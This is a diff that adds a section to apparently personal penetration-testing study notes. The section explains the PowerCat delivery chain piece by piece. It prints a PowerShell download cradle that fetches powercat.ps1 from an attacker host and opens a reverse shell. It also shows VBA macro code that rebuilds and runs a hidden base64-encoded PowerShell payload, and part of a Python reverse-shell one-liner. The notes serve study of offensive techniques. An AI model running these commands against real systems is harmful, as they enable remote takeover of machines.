@@ -92,5 +92,39 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 ---
 
+## The PowerCat delivery chain: download cradle, `-e powershell`, and why it needs chunking inside a macro
+
+**Full command (the download-and-execute half):**
+```powershell
+IEX(New-Object System.Net.WebClient).DownloadString('http://<kali_ip>/powercat.ps1');powercat -c <kali_ip> -p 4444 -e powershell
+```
+
+**Piece by piece:**
+- `(New-Object System.Net.WebClient).DownloadString('http://<kali_ip>/powercat.ps1')` → fetches the PowerCat script's raw text over HTTP, as a string, entirely in memory. Nothing touches disk, no file gets written to the target that AV could scan at rest.
+- `IEX(...)` → short for `Invoke-Expression`, takes that fetched string and executes it as PowerShell code immediately, in the current session. This two-step "download the text, then `IEX` it" pattern is the standard PowerShell **download cradle**, it's what turns a plain HTTP GET into code actually running on the target. Once this runs, every function PowerCat defines (including the `powercat` command itself) becomes available in the current session.
+- `powercat -c <kali_ip> -p 4444 -e powershell` → now that PowerCat's own function is loaded, this line calls it: `-c` (client mode, connect out to the listener) `-p` (port) `-e powershell` (execute `powershell.exe` and pipe its input/output through the connection, PowerCat's equivalent of netcat's `-e`). This is what actually produces the interactive reverse shell, the `IEX` line above only loaded the tool, it didn't call it yet.
+- Why PowerCat over a hand-rolled PowerShell reverse-shell one-liner: PowerCat is a maintained, well-tested implementation that handles the socket/stream plumbing correctly, versus hand-writing raw `.NET` socket code (like the `TCPClient`/`NetworkStream` version used elsewhere) every time. Trade-off: it requires two network round trips (fetch the script, then the actual shell callback) instead of one self-contained payload, and it depends on the target being able to reach your web server, not just your listener.
+
+**Why the same payload needs chunking when delivered via a VBA macro, but not via a URL parameter:**
+```vba
+Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
+Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
+' ...more chunks...
+CreateObject("Wscript.Shell").Run Str
+```
+- Delivered through a URL parameter (as in [[Common Web Application Attacks#9.4.1. OS Command Injection|9.4.1]]'s command injection case), the base64-encoded payload is just one long string handed to `curl`, no length ceiling that matters in practice.
+- Delivered through a **VBA string literal** (as in [[Client-Side Attacks#12.2.3. Leveraging Microsoft Word Macros|12.2.3]]), VBA imposes a hard **255-character limit per string literal**. A base64-encoded reverse shell command easily runs past that. The fix is mechanical concatenation: split the full string into ≤255-char (50 was used here, comfortably under the limit) pieces and rebuild it at runtime with repeated `Str = Str + "<chunk>"` lines, `Str` ends up holding the complete original string once every line has executed, VBA just never has to hold more than one chunk as a literal at a time.
+- Generate the split with a script, not by hand: manually counting out 50-character boundaries in a 300+ character base64 blob is exactly the kind of task a single miscounted character silently breaks, with no error until the payload fails to decode on the target. A short Python loop (`for i in range(0, len(s), 50): print(...)`) removes that risk entirely.
+
+**Where this comes from:** PowerCat itself ships in Kali at `/usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1`, its own script header documents the `-c`/`-p`/`-e` flags. The download-cradle pattern (`IEX` + `DownloadString`) is one of the most common PowerShell attack primitives, covered extensively on both HackTricks' and PayloadsAllTheThings' Windows/reverse-shell pages. VBA's 255-character string literal limit is a Visual Basic language fact, not exploit-specific, documented in Microsoft's own VBA language reference.
+
+**Where to look in the response:** nothing in an HTTP response for the cradle itself, watch your Python HTTP server's access log for a `GET /powercat.ps1` (confirms the target actually fetched it, distinguishes "macro didn't fire" from "macro fired but network egress failed") and your `nc -nvlp` listener for the actual shell callback.
+
+🔁 **Seen in:** [[Client-Side Attacks#12.2.3. Leveraging Microsoft Word Macros|Client-Side Attacks, 12.2.3]] (VBA-chunked) and [[Client-Side Attacks#Step 4: Build the `.lnk` shortcut payload (the actual reverse-shell trigger)|Client-Side Attacks, 12.3.1 Step 4]] (unchunked, direct shortcut target).
+
+#### Tags: #PowerCat #DownloadCradle #IEX #VBAStringLimit #MechanicalChunking #CommandBreakdowns
+
+---
+
 ## **Outstanding**
-- [ ] Powercat delivery chain (download cradle + `-e powershell`), CFM webshell tag syntax, JuicyPotato CLSID token impersonation.
+- [ ] CFM webshell tag syntax, JuicyPotato CLSID token impersonation.
